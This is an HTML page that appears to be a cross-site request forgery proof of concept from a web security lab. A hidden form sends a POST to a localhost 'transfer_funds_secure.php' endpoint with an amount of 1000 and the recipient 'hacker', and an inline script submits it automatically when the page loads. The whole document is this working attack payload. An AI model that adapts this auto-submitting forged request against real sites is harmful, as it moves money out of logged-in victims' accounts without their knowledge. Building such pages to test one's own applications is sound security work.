<html>

<body>
    <form id="form" method="POST" action="http://localhost/wdt/transfer_funds_secure.php" style="display: none;">
        <input type="num" name="amount" value="1000" />
        <input type="text" name="to" value="hacker" />
        <input type="submit" />
    </form>

    <script>
        const form = document.getElementById("form")
        form.submit()
    </script>
</body>

</html>